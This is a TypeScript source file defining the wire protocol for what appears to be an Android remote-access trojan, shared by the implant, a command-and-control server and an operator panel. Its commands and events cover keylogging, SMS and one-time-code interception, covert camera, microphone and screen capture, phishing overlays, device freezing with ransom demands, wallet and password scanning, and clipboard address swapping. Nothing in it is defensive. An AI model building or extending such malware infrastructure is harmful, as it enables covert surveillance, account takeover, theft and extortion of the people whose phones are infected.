/**
 * XRC protocol v1 — single source of truth for implant ↔ server ↔ panel.
 * Imported by the Fastify server and the React panel; the Kotlin implant
 * mirrors this byte-for-byte. Never fork these types.
 */

export const PROTOCOL_VERSION = 1;

/* ------------------------------------------------------------------ */
/* Envelope                                                            */
/* ------------------------------------------------------------------ */

export interface Envelope {
  v: typeof PROTOCOL_VERSION;
  /** uuid per message, echoed in responses */
  id: string;
  t: 'cmd' | 'evt' | 'res';
  d: unknown;
}

/* ------------------------------------------------------------------ */
/* Command codes (wire format, implant side)                           */
/* ------------------------------------------------------------------ */

export const CMD = {
  PING: '0xPI',
  INFO: '0xIF',
  KEYLOG: '0xKL',
  SMS: '0xSM',
  NOTIF: '0xNO',
  OTP: '0xOT',
  LOCATION: '0xLO',
  CAMERA: '0xCA',
  MIC: '0xMI',
  FILES: '0xFI',
  SCREEN: '0xSC',
  GESTURE: '0xGE',
  TEXT: '0xTX',
  OVERLAY: '0xOV',
  FREEZE: '0xFR',
  RANSOM: '0xRM',
  WALLET_SCAN: '0xWS',
  PASS_SCAN: '0xPS',
  CLIPBOARD: '0xCL',
  APPS: '0xAP',
  PERMS: '0xPM',
  KILL: '0xKW',
} as const;

export type CmdCode = (typeof CMD)[keyof typeof CMD];

export type GestureType =
  | 'tap' | 'swipe' | 'long_press'
  | 'home' | 'back' | 'recents'
  | 'vol_up' | 'vol_down' | 'power'
  | 'notifications' | 'quick_settings' | 'screenshot';

/* ------------------------------------------------------------------ */
/* Command payloads (panel → implant)                                  */
/* ------------------------------------------------------------------ */

export type Command =
  | { cmd: typeof CMD.PING }
  | { cmd: typeof CMD.INFO }
  | { cmd: typeof CMD.KEYLOG; flush?: boolean }
  | { cmd: typeof CMD.SMS; action: 'list' | 'send'; to?: string; body?: string }
  | { cmd: typeof CMD.NOTIF; action: 'enable' | 'disable' | 'list' }
  | { cmd: typeof CMD.LOCATION; mode: 'once' | 'continuous' | 'stop' }
  | { cmd: typeof CMD.CAMERA; cam: 'front' | 'rear'; action: 'snap' | 'burst' | 'stop'; durSec?: number }
  | { cmd: typeof CMD.MIC; action: 'start' | 'stop'; durSec?: number }
  | { cmd: typeof CMD.FILES; action: 'list' | 'pull' | 'delete'; path?: string }
  | { cmd: typeof CMD.SCREEN; action: 'start' | 'stop'; fps?: number }
  | { cmd: typeof CMD.GESTURE; type: GestureType; x?: number; y?: number; x2?: number; y2?: number; durMs?: number }
  | { cmd: typeof CMD.TEXT; text: string }
  | { cmd: typeof CMD.OVERLAY; slug: string; url: string }
  | { cmd: typeof CMD.FREEZE; on: boolean }
  | { cmd: typeof CMD.RANSOM; note: string; amount: string; currency: string; address: string; hours: number }
  | { cmd: typeof CMD.WALLET_SCAN }
  | { cmd: typeof CMD.PASS_SCAN }
  | { cmd: typeof CMD.CLIPBOARD; action: 'list' | 'watch' | 'swap'; address?: string }
  | { cmd: typeof CMD.APPS }
  | { cmd: typeof CMD.PERMS; action: 'grant_all' | 'status' }
  | { cmd: typeof CMD.KILL; confirm: string };

/* ------------------------------------------------------------------ */
/* Device state                                                       */
/* ------------------------------------------------------------------ */

export type DeviceStatus = 'online' | 'offline' | 'frozen';

export interface DeviceInfo {
  id: string;
  name: string;
  model: string;
  manufacturer: string;
  android: string;
  sdk: number;
  carrier: string;
  /** signal strength dBm */
  signal: number;
  /** battery percent 0–100 */
  battery: number;
  /** battery temp °C */
  temp: number;
  ramUsed: number;
  ramTotal: number;
  storageFree: number;
  storageTotal: number;
  ipLocal: string;
  ipPublic: string;
  city: string | null;
  /** MIUI / One UI / ColorOS / OxygenOS / null */
  skin: string | null;
  rooted: boolean;
  status: DeviceStatus;
  reconnectAttempts: number;
  firstSeen: number;
  lastSeen: number;
}

export interface DeviceSummary {
  id: string;
  name: string;
  model: string;
  android: string;
  carrier: string;
  signal: number;
  battery: number;
  status: DeviceStatus;
  city: string | null;
  keylogCount: number;
  otpCount: number;
  lastSeen: number;
}

/* ------------------------------------------------------------------ */
/* Events (implant → panel, live)                                      */
/* ------------------------------------------------------------------ */

export type ImplantEvent =
  | { kind: 'info'; deviceId: string; info: DeviceInfo; ts: number }
  | { kind: 'keylog'; deviceId: string; app: string; text: string; ts: number }
  | { kind: 'sms'; deviceId: string; from: string; text: string; ts: number }
  | { kind: 'notif'; deviceId: string; app: string; text: string; ts: number }
  | { kind: 'otp'; deviceId: string; source: string; code: string; ts: number }
  | { kind: 'location'; deviceId: string; lat: number; lng: number; acc: number; ts: number }
  | { kind: 'capture'; deviceId: string; type: 'camera' | 'mic' | 'screen'; ref: string; ts: number }
  | { kind: 'scan'; deviceId: string; type: 'wallet' | 'password'; payload: Record<string, unknown>; ts: number }
  | { kind: 'status'; deviceId: string; status: DeviceStatus; attempts: number; ts: number };

/* ------------------------------------------------------------------ */
/* REST API                                                           */
/* ------------------------------------------------------------------ */

export interface ApiRes<T = unknown> {
  success: boolean;
  data?: T;
  error?: string;
}

export interface DevicesRes {
  devices: DeviceSummary[];
  total: number;
}

export interface StatsRes {
  totalDevices: number;
  online: number;
  frozen: number;
  keylogs24h: number;
  otps24h: number;
  captures24h: number;
  overlaysServed: number;
  byStatus: Record<DeviceStatus, number>;
  byModel: Record<string, number>;
}

export interface LogEntry {
  id: number;
  ts: number;
  type: 'keylog' | 'otp' | 'sms' | 'notif' | 'command' | 'system' | 'danger' | 'ok' | 'warn';
  deviceId: string | null;
  text: string;
  }
